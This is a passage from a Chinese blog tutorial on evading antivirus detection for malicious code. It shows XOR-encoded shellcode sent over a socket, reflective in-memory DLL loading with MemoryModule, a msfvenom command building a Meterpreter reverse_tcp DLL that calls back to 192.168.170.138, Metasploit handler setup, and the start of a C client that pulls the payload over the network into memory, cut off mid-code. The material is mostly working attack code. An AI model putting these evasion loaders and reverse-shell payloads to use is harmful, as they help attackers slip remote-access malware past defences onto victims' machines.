\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a"</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">wmain</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> TCHAR argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    DWORD dwError<span class="token punctuation">;</span>
    WORD sockVersion <span class="token operator">=</span> <span class="token function">MAKEWORD</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    WSADATA wsaData<span class="token punctuation">;</span>
    SOCKET socks<span class="token punctuation">;</span>
    SHORT sListenPort <span class="token operator">=</span> <span class="token number">8888</span><span class="token punctuation">;</span>
    <span class="token keyword">struct</span> sockaddr_in sin<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WSAStartup</span><span class="token punctuation">(</span>sockVersion<span class="token punctuation">,</span> <span class="token operator">&amp;</span>wsaData<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        dwError <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]WSAStarup Error : %d \n"</span><span class="token punctuation">,</span>dwError<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> dwError<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    socks <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> IPPROTO_TCP<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>socks <span class="token operator">==</span> INVALID_SOCKET<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        dwError <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]Socket Error : %d \n"</span><span class="token punctuation">,</span>dwError<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> dwError<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    sin<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>
    sin<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span>sListenPort<span class="token punctuation">)</span><span class="token punctuation">;</span>
    sin<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>S_un<span class="token punctuation">.</span>S_addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span><span class="token string">"192.168.170.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">connect</span><span class="token punctuation">(</span>socks<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>sin<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>sin<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> SOCKET_ERROR <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        dwError <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]Bind Error : %d \n"</span><span class="token punctuation">,</span>dwError<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> dwError<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token function">send</span><span class="token punctuation">(</span>socks<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+]Send %d-Bytes \n"</span><span class="token punctuation">,</span>ret<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">closesocket</span><span class="token punctuation">(</span>socks<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">WSACleanup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008165858558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>virustotal<span class="token punctuation">.</span>com<span class="token operator">/</span>gui<span class="token operator">/</span>file<span class="token operator">/</span><span class="token number">15097</span>ce3f38d81a1e8c6b6d5b7fe5fb7965bfc09a6ec6a0f54280036e3820c66<span class="token operator">/</span>detection
</code></pre>
<hr>
<h2><a id="9112__1372"></a>9.1.12 静态恶意代码逃逸（第六课）</h2>
<p>前六课的代码将会上传至Github，方便读者下载研究 :</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>Rvn0xsy<span class="token operator">/</span>BadCode
</code></pre>
<p><strong>0x01 MemoryModule</strong></p>
<p>先来介绍以下MemoryModule这个项目的来源。</p>
<p><a href="https://payloads.online/archivers/2019-03-14/1">MemoryModule-实现原理</a></p>
<p>项目背景：Windows操作系统在执行一个Windows PE格式的文件时，Windows自身是有一个Windows PE格式的解析器，通过PE格式把文件的各个节放入不同的内存区域。</p>
<p>爱折腾的程序员自己也想实现这个过程，那就是反射，这个反射机制就是将Windows PE格式通过自己写的代码进行解析，并把不同的节数据加载到内存中，通常这个反射加载技术被很多APT组织、大型渗透框架、病毒作者使用比较广泛。</p>
<p>当一个Windows PE格式的文件变成了一个内存中的字符串，意味着这个文件可以被任意方式去转换、加密、混淆，因此反病毒软件也难以查杀。</p>
<p>MemoryModule就是实现了这个过程：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>fancycode<span class="token operator">/</span>MemoryModule
</code></pre>
<p>但是资料都是英文的，我在国内的社区上找到了中文版本的：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>gitee<span class="token punctuation">.</span>com<span class="token operator">/</span>china_jeffery<span class="token operator">/</span>MemoryModule
</code></pre>
<p><strong>0x02 反射DLL加载的实验</strong></p>
<p>首先体验一下正常DLL加载的过程：</p>
<p>写一个DLL：</p>
<pre><code class="prism language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>

VOID <span class="token function">msg</span><span class="token punctuation">(</span>VOID<span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token function">MessageBox</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"Test"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这里我采用了Def文件来进行导出：<br>
<img src="https://img-blog.csdnimg.cn/20201008170109508.png#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201008170116606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span>;</span>

<span class="token keyword">typedef</span> VOID <span class="token punctuation">(</span><span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">(</span>VOID<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	msg RunMsg<span class="token punctuation">;</span>
	HMODULE  hBadCode <span class="token operator">=</span> <span class="token function">LoadLibrary</span><span class="token punctuation">(</span><span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"BadCode-DLL.dll"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	RunMsg <span class="token operator">=</span> <span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>hBadCode<span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">RunMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">FreeLibrary</span><span class="token punctuation">(</span>hBadCode<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>通过LoadLibrary这个API来加载DLL文件，使其运行，看起来是一个基础操作，那么还有另外一种方式吗？</p>
<p>接下来贴上MemoryModule的使用方法：</p>
<pre><code class="prism language-c"><span class="token number">1</span>、将要加载的PE文件读入内存
<span class="token number">2</span>、初始化MemoryModule句柄
<span class="token number">3</span>、装载内存
<span class="token number">4</span>、获得导出函数地址
<span class="token number">5</span>、执行导出函数
<span class="token number">6</span>、释放MemoryModule句柄
</code></pre>
<p>这里我将MemoryModule项目代码放入当前项目：<br>
<img src="https://img-blog.csdnimg.cn/20201008170156338.png#pic_center" alt="在这里插入图片描述"><br>
主要是：<code>MemoryModule.h</code>、<code>MemoryModule.cpp</code></p>
<p>加载代码</p>
<pre><code class="prism language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span>;</span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"MemoryModule.h"</span></span>

<span class="token keyword">typedef</span> VOID <span class="token punctuation">(</span><span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">(</span>VOID<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 打开文件并获取大小</span>
DWORD <span class="token function">OpenBadCodeDLL</span><span class="token punctuation">(</span>HANDLE <span class="token operator">&amp;</span> hBadCodeDll<span class="token punctuation">,</span> LPCWSTR lpwszBadCodeFileName<span class="token punctuation">)</span><span class="token punctuation">{</span>
	DWORD dwHighFileSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	DWORD dwLowFileSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token comment">// 打开文件</span>
	hBadCodeDll <span class="token operator">=</span> <span class="token function">CreateFile</span><span class="token punctuation">(</span>lpwszBadCodeFileName<span class="token punctuation">,</span>GENERIC_READ<span class="token punctuation">,</span>FILE_SHARE_READ<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span>OPEN_ALWAYS<span class="token punctuation">,</span>FILE_ATTRIBUTE_NORMAL <span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>hBadCodeDll <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	dwLowFileSize <span class="token operator">=</span> <span class="token function">GetFileSize</span><span class="token punctuation">(</span>hBadCodeDll<span class="token punctuation">,</span><span class="token operator">&amp;</span>dwHighFileSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> dwLowFileSize<span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	msg RunMsg<span class="token punctuation">;</span>  <span class="token comment">// msg函数的函数指针</span>
	HMEMORYMODULE hModule<span class="token punctuation">;</span> <span class="token comment">// MemoryModule句柄，应该可以这么理解,,</span>
	HANDLE hBadCodeDll <span class="token operator">=</span> INVALID_HANDLE_VALUE<span class="token punctuation">;</span> <span class="token comment">// 打开PE文件的句柄</span>
	WCHAR szBadCodeFile<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\admin\\Documents\\Visual Studio 2012\\Projects\\BadCode\\Debug\\BadCode-DLL.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// PE文件的物理路径</span>
	DWORD dwFileSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// PE文件大小</span>
	DWORD dwReadOfFileSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 已读取的PE文件大小</span>
	PBYTE bFileBuffer <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">// PE文件的内存地址</span>
	
	<span class="token comment">// 打开文件</span>
	dwFileSize <span class="token operator">=</span> <span class="token function">OpenBadCodeDLL</span><span class="token punctuation">(</span>hBadCodeDll<span class="token punctuation">,</span> szBadCodeFile<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 如果打开失败直接退出</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>hBadCodeDll <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token comment">// 申请放置PE文件的内存空间</span>
	bFileBuffer <span class="token operator">=</span> new BYTE<span class="token punctuation">[</span>dwFileSize<span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token comment">// 读取文件</span>
	<span class="token function">ReadFile</span><span class="token punctuation">(</span>hBadCodeDll<span class="token punctuation">,</span>bFileBuffer<span class="token punctuation">,</span>dwFileSize<span class="token punctuation">,</span><span class="token operator">&amp;</span>dwReadOfFileSize<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 如果读取错误直接退出</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>dwReadOfFileSize <span class="token operator">!=</span> dwFileSize<span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token comment">// 关闭打开PE文件的句柄</span>
	<span class="token function">CloseHandle</span><span class="token punctuation">(</span>hBadCodeDll<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 导入PE文件</span>
	hModule <span class="token operator">=</span> <span class="token function">MemoryLoadLibrary</span><span class="token punctuation">(</span>bFileBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 如果加载失败，就退出</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>hModule <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		delete <span class="token punctuation">[</span><span class="token punctuation">]</span> bFileBuffer<span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token comment">// 获取msg导出函数地址</span>
	RunMsg <span class="token operator">=</span> <span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token function">MemoryGetProcAddress</span><span class="token punctuation">(</span>hModule<span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 运行msg函数</span>
	<span class="token function">RunMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 释放资源</span>
	<span class="token function">MemoryFreeLibrary</span><span class="token punctuation">(</span>hModule<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 释放PE内存</span>
	delete <span class="token punctuation">[</span><span class="token punctuation">]</span> bFileBuffer<span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>运行结果：<br>
<img src="https://img-blog.csdnimg.cn/20201008170226409.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
能够看到，成功加载并执行了msg函数。</p>
<p><strong>0x03 反射DLL与MSF联动</strong></p>
<p>不知道大家还是否记得第五课的Socket方式加载Shellcode，这里我将复用第五课的代码来实现与MSF的联动免杀。</p>
<p>思路是这样的：</p>
<p>通过Socket将Msf生成的DLL给接收到内存中，然后载入MemoryModule中，直接执行。</p>
<p><strong>生成DLL</strong></p>
<pre><code class="prism language-c">msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.170</span><span class="token number">.138</span> LPORT<span class="token operator">=</span><span class="token number">8899</span> <span class="token operator">-</span>f dll <span class="token operator">-</span>o <span class="token operator">~</span><span class="token operator">/</span>y<span class="token punctuation">.</span>dll
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201008170253499.png#pic_center" alt="在这里插入图片描述"><br>
生成了一个5120字节的DLL</p>
<p>然后设置一下MSF DLL发射器：</p>
<pre><code class="prism language-c">msf5 <span class="token operator">&gt;</span> handler <span class="token operator">-</span>p windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp <span class="token operator">-</span>H <span class="token number">192.168</span><span class="token number">.170</span><span class="token number">.138</span> <span class="token operator">-</span>P <span class="token number">8899</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Payload handler running as background job <span class="token number">0.</span>

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.170</span><span class="token number">.138</span><span class="token punctuation">:</span><span class="token number">8899</span> 
msf5 <span class="token operator">&gt;</span> use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler 
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set payload windows<span class="token operator">/</span>patchupdllinject<span class="token operator">/</span>reverse_tcp
payload <span class="token operator">=</span><span class="token operator">&gt;</span> windows<span class="token operator">/</span>patchupdllinject<span class="token operator">/</span>reverse_tcp
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set LHOST <span class="token number">192.168</span><span class="token number">.170</span><span class="token number">.138</span> 
LHOST <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.170</span><span class="token number">.138</span>
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set LPORT <span class="token number">8888</span>
LPORT <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">8888</span>
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> set DLL <span class="token operator">~</span><span class="token operator">/</span>y<span class="token punctuation">.</span>dll
DLL <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token operator">~</span><span class="token operator">/</span>y<span class="token punctuation">.</span>dll
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit <span class="token operator">-</span>j
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Exploit running as background job <span class="token number">1.</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Exploit completed<span class="token punctuation">,</span> but no session was created<span class="token punctuation">.</span>

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.170</span><span class="token number">.138</span><span class="token punctuation">:</span><span class="token number">8888</span> 
msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> 
</code></pre>
<p>此时就需要来撸码了，实现一个客户端，去Msf上获取DLL：</p>
<pre><code class="prism language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;WinSock2.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"MemoryModule.h"</span></span>
<span class="token macro property">#<span class="token directive keyword">pragma</span> comment(lib,"ws2_32.lib")</span>

<span class="token macro property">#<span class="token directive keyword">define</span> PAYLOAD_SIZE 1024*512</span>
<span class="token keyword">typedef</span> BOOL <span class="token punctuation">(</span><span class="token operator">*</span>Module<span class="token punctuation">)</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span> DWORD ul_reason_for_call <span class="token punctuation">,</span> LPVOID lpReserved<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">typedef</span> VOID <span class="token punctuation">(</span><span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">(</span>VOID<span class="token punctuation">)</span><span class="token punctuation">;</span>
PBYTE bFileBuffer <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>


BOOL <span class="token function">GetPEDLL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	
	DWORD dwError<span class="token punctuation">;</span>
	WORD sockVersion <span class="token operator">=</span> <span class="token function">MAKEWORD</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	WSADATA wsaData<span class="token punctuation">;</span>
	SOCKET socks<span class="token punctuation">;</span>
	SHORT sListenPort <span class="token operator">=</span> <span class="token number">8888</span><span class="token punctuation">;</span>
	<span class="token keyword">struct</span> sockaddr_in sin<span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WSAStartup</span><span class="token punctuation">(</span>sockVersion<span class="token punctuation">,</span> <span class="token operator">&amp;</span>wsaData<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		dwError <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]WSAStarup Error : %d \n"</span><span class="token punctuation">,</span>dwError<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	
	socks <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> IPPROTO_TCP<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>socks <span class="token operator">==</span> INVALID_SOCKET<span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		dwError <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*]Socket Error : %d \n"</span><span class="token punctuation">,</span>dwError<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	sin<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>
	sin<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span>sListenPort<span class="token punctuation">)</span><span class="token punctuation">;</span>
	sin<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>S_un<span class="token punctuation">.</span>S_addr <span class="token operator">=</span> <span class="token function">inet_addr</span><span class="token punctuation">(</span><span class="token string">"192.168.170.138"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

